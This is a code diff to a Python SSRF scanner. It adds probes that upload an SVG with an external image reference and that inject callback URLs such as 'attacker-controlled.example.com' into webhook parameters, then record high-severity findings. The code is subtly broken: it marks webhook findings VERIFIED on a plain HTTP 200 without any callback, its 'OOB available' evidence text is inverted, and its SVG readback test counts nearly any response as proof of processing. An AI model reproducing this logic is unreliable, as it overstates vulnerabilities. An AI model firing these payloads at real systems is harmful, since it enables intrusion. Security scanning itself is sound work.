@@ -348,34 +348,106 @@ class SSRFScanner(ScannerBase):
     # ── SVG / file upload SSRF testing ──────────────────────────────────
 
     def _test_svg_upload(self, url: str) -> None:
-        """Send an SVG file with an external image reference to test SSRF."""
+        """Send an SVG file with an external image reference to test SSRF.
+
+        If OOB is available, uses SVG with external image href for callback.
+        Without OOB, attempts to read back the uploaded SVG to confirm
+        server-side processing (e.g. thumbnail generation), which indicates
+        the server fetched external resources.
+        """
         oob_host = self.config.get("oob_host")
-        if not oob_host:
-            return
-        svg_content = SSRF_SVG_PAYLOAD.replace("{oob}", oob_host)
+        svg_oob = oob_host or "oob.example.com"
+        svg_content = SSRF_SVG_PAYLOAD.replace("{oob}", svg_oob)
         files = {"file": ("test.svg", svg_content, "image/svg+xml")}
         try:
             resp = safe_post(self.session, url, files=files, timeout=self.timeout)
             if resp and resp.status_code in (200, 201, 202):
-                log(f"  [SSRF SVG] Upload accepted at {url}", Colors.GREEN,
-                    verbose_only=True, verbose=self.verbose)
+                # Try to read back the uploaded SVG to confirm processing
+                processed = False
+                upload_readback = None
+                if oob_host:
+                    # OOB will confirm server-side fetch of the xlink:href
+                    processed = True
+                else:
+                    # Without OOB, probe for the uploaded file to see if
+                    # the server parsed/generated a thumbnail
+                    readbacks = [
+                        url,
+                        url.rstrip("/") + "/test.svg",
+                        url.replace("/upload", "/uploads/test.svg"),
+                        url.replace("/upload/", "/uploads/") + "test.svg",
+                    ]
+                    for rb_url in readbacks:
+                        try:
+                            rb = safe_get(self.session, rb_url, self.timeout, raise_for_status=False)
+                            if rb and rb.status_code == 200 and len(rb.text or "") > 50:
+                                # Response body differs from raw SVG — server processed it
+                                if "<?xml" not in (rb.text or "")[:20] or svg_content not in (rb.text or ""):
+                                    upload_readback = rb_url
+                                    processed = True
+                                    break
+                        except Exception:
+                            continue
+
+                if processed or oob_host:
+                    f_dict = finding(
+                        vuln_type="SSRF via SVG Upload",
+                        url=url,
+                        severity="high",
+                        details="SVG file upload accepted — external image reference may trigger server-side request forgery",
+                        evidence=f"SVG upload accepted at {url}" + (f" — confirmed processed (readback: {upload_readback})" if upload_readback else ""),
+                        verification_stage=VerificationStage.DETECTED.value,
+                        request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
+                        response_excerpt=resp.text[:500],
+                        steps_to_reproduce=[
+                            f"Upload SVG file with external image reference to {url}",
+                            "SVG contains <image xlink:href> pointing to attacker-controlled server",
+                            "Observe callback from target server — confirms SSRF via SVG processing",
+                        ],
+                    )
+                    if f_dict:
+                        self._add_finding(f_dict)
+                        log(f"  [SSRF SVG] Finding created — upload accepted at {url}",
+                            Colors.GREEN, verbose_only=True, verbose=self.verbose)
         except Exception:
             pass
 
     def _test_webhook_endpoints(self, url: str) -> None:
         """Test webhook registration endpoints for SSRF by registering
-        a callback URL."""
+        a callback URL.
+
+        Without OOB, findings stay at DETECTED stage (SSRF likely but
+        not confirmed). With OOB, they can reach VERIFIED.
+        """
         oob_host = self.config.get("oob_host")
-        if not oob_host:
-            return
         for param in SSRF_WEBHOOK_PARAMS:
-            payload_url = f"http://{oob_host}/ssrf-webhook"
+            payload_host = oob_host or "attacker-controlled.example.com"
+            payload_url = f"http://{payload_host}/ssrf-webhook"
             test_url = f"{url}?{param}={payload_url}"
             try:
                 resp = safe_get(self.session, test_url, self.timeout)
                 if resp and resp.status_code == 200:
-                    log(f"  [SSRF Webhook] Payload accepted at {url} via {param}",
-                        Colors.GREEN, verbose_only=True, verbose=self.verbose)
+                    stage = VerificationStage.VERIFIED.value if oob_host else VerificationStage.DETECTED.value
+                    f_dict = finding(
+                        vuln_type="SSRF via Webhook Endpoint",
+                        url=url,
+                        severity="high",
+                        details=f"Webhook parameter '{param}' accepted a URL — server may fetch external resources on registration",
+                        evidence=f"Parameter '{param}' = {payload_url} — responded with HTTP {resp.status_code}" + (" (OOB available, confirmation pending)" if not oob_host else ""),
+                        verification_stage=stage,
+                        parameter=param,
+                        request=_build_curl("GET", test_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
+                        response_excerpt=resp.text[:500],
+                        steps_to_reproduce=[
+                            f"Send request to {url} with parameter '{param}' = http://attacker-controlled.com/webhook",
+                            "Server accepts the URL as a webhook callback endpoint",
+                            "If server fetches the URL, SSRF is confirmed",
+                        ],
+                    )
+                    if f_dict:
+                        self._add_finding(f_dict)
+                        log(f"  [SSRF Webhook] Finding created — payload accepted at {url} via {param}",
+                            Colors.GREEN, verbose_only=True, verbose=self.verbose)
             except Exception:
                 continue
 
